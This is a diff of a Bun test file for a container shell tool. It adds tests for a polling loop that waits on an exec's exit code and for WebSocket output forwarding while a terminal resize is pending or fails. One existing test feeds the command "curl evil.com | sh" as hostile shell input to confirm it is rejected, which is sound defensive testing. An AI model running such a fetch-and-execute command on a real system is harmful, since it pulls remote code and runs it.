@@ -1,4 +1,4 @@
-import { describe, expect, test, mock, beforeAll } from 'bun:test';
+import { describe, expect, test, mock, beforeAll, beforeEach, afterEach, spyOn } from 'bun:test';
 import { EventEmitter } from 'node:events';
 import { Readable } from 'node:stream';
 import net from 'node:net';
@@ -88,6 +88,85 @@ describe('probeShell', () => {
     const shell = await probeShell(container as any, "bash -c 'curl evil.com | sh'");
     expect(shell).toBe('');
     expect(container.exec).not.toHaveBeenCalled();
+  });
+
+  describe('Detach+inspect polling loop', () => {
+    // The poll loop (exec.ts lines ~140-143) only runs when inspect()'s first
+    // response is ExitCode -1 (still running). The default makeMockContainer
+    // always returns the final code, so these tests build their own mocks to
+    // exercise the in-flight branch added in commit d6f375c.
+
+    let setTimeoutSpy: ReturnType<typeof spyOn>;
+    beforeEach(() => {
+      // Fire setTimeout callbacks immediately so the 50ms poll interval doesn't
+      // stretch each test out to multiple seconds.
+      setTimeoutSpy = spyOn(globalThis, 'setTimeout').mockImplementation(((cb: () => void) => {
+        cb();
+        return 0 as unknown as ReturnType<typeof setTimeout>;
+      }) as typeof setTimeout);
+    });
+    afterEach(() => { setTimeoutSpy.mockRestore(); });
+
+    test('polls inspect() until ExitCode flips from -1 to 0 and returns the shell', async () => {
+      let inspectCount = 0;
+      const container = {
+        exec: mock(async () => ({
+          start: mock(async () => {}),
+          inspect: mock(async () => {
+            inspectCount += 1;
+            // First two calls report "still running", third call reports clean exit.
+            return { ExitCode: inspectCount >= 3 ? 0 : -1 };
+          }),
+          resize: mock(async () => {}),
+        })),
+      };
+
+      const shell = await probeShell(container as any, 'auto');
+      expect(shell).toBe('bash');
+      expect(inspectCount).toBeGreaterThanOrEqual(3);
+    });
+
+    test('moves to next candidate when ExitCode stays -1 past the deadline', async () => {
+      // Date.now must advance past start+5000 within a few iterations so the
+      // while loop exits via the deadline check without a real 5-second wait.
+      const dateSpy = spyOn(Date, 'now');
+      // deadline = first call + 5000. Subsequent calls jump fast.
+      dateSpy
+        .mockReturnValueOnce(1_000_000)        // deadline = 1_005_000
+        .mockReturnValueOnce(1_000_100)        // loop iter 1: still under deadline
+        .mockReturnValueOnce(1_006_000)        // loop iter 2: past deadline -> exit
+        // bash candidate also calls Date.now during its loop on the next shell
+        // attempt; sh's loop reuses fresh deadline math. Provide enough values
+        // for sh and ash to also exit via deadline.
+        .mockReturnValueOnce(2_000_000)
+        .mockReturnValueOnce(2_006_000)
+        .mockReturnValueOnce(3_000_000)
+        .mockReturnValueOnce(3_006_000)
+        .mockReturnValue(9_999_999);            // any further calls -> deadline expired
+
+      let bashAttempts = 0;
+      const container = {
+        exec: mock(async (opts: { Cmd: string[] }) => {
+          if (opts.Cmd[0] === 'bash') bashAttempts += 1;
+          return {
+            start: mock(async () => {}),
+            // Always still running; polling loop exits via deadline.
+            inspect: mock(async () => ({ ExitCode: -1 })),
+            resize: mock(async () => {}),
+          };
+        }),
+      };
+
+      try {
+        const shell = await probeShell(container as any, 'auto');
+        // None of bash/sh/ash ever reach ExitCode 0, so probeShell yields ''.
+        expect(shell).toBe('');
+        // bash WAS attempted (poll ran), but did NOT return as the resolved shell.
+        expect(bashAttempts).toBe(1);
+      } finally {
+        dateSpy.mockRestore();
+      }
+    });
   });
 });
 
@@ -316,5 +395,75 @@ describe('handleExecSocket', () => {
     await new Promise((r) => setTimeout(r, 20));
 
     expect(mockWs.close).toHaveBeenCalledWith(1011, 'Exec stream error');
+  });
+
+  test('forwards stream chunks even while exec.resize is still pending', async () => {
+    // Pins the ordering established in commit 226131a: exec.resize is launched
+    // as fire-and-forget AFTER ws.data.execStream is set and the async-iter
+    // consumer is started. A regression that put `await exec.resize(...)` ahead
+    // of the consumer would block ws.send until resize resolved.
+    const { stream: execStream, push } = makeControllableStream();
+    // Held captive for the test lifetime: resize never resolves on purpose so
+    // any code that awaits it would deadlock and ws.send would never fire.
+    const resizePromise = new Promise<void>(() => { /* never resolves */ });
+    const createdExecInstances: Array<{ resize: ReturnType<typeof mock> }> = [];
+
+    const ttyContainer = {
+      exec: mock(async (opts: { Tty?: boolean }) => {
+        const inst = {
+          id: opts.Tty ? 'exec-id-pending-resize' : undefined,
+          start: mock(async () => {}),
+          inspect: mock(async () => ({ ExitCode: 0 })),
+          resize: mock(() => resizePromise),
+        };
+        createdExecInstances.push(inst);
+        return inst;
+      }),
+    };
+    const mockDocker = { getContainer: mock(() => ttyContainer) };
+    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 120, rows: 40 } };
+    const startStream = mock(async () => ({
+      socket: execStream as unknown as import('node:net').Socket,
+      initialBytes: Buffer.alloc(0),
+    }));
+
+    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);
+
+    push(Buffer.from('output-after-resize-deferred'));
+    await new Promise((r) => setTimeout(r, 20));
+
+    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('output-after-resize-deferred'));
+    // Sanity: resize WAS dispatched on the TTY exec instance the handler
+    // created (so the call shape under test is the real fire-and-forget path).
+    const ttyInst = createdExecInstances.at(-1);
+    expect(ttyInst?.resize).toHaveBeenCalled();
+  });
+
+  test('exec.resize rejection is swallowed and does not close the session', async () => {
+    const { stream: execStream, push } = makeControllableStream();
+    const ttyContainer = {
+      exec: mock(async (opts: { Tty?: boolean }) => ({
+        id: opts.Tty ? 'exec-id-resize-rejects' : undefined,
+        start: mock(async () => {}),
+        inspect: mock(async () => ({ ExitCode: 0 })),
+        resize: mock(async () => { throw new Error('docker resize failed'); }),
+      })),
+    };
+    const mockDocker = { getContainer: mock(() => ttyContainer) };
+    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
+    const startStream = mock(async () => ({
+      socket: execStream as unknown as import('node:net').Socket,
+      initialBytes: Buffer.alloc(0),
+    }));
+
+    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);
+
+    push(Buffer.from('still-flowing'));
+    // Allow the rejected resize promise's .catch handler to settle.
+    await new Promise((r) => setTimeout(r, 20));
+
+    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('still-flowing'));
+    // The session must NOT have been closed by the resize rejection.
+    expect(mockWs.close).not.toHaveBeenCalled();
   });
 });
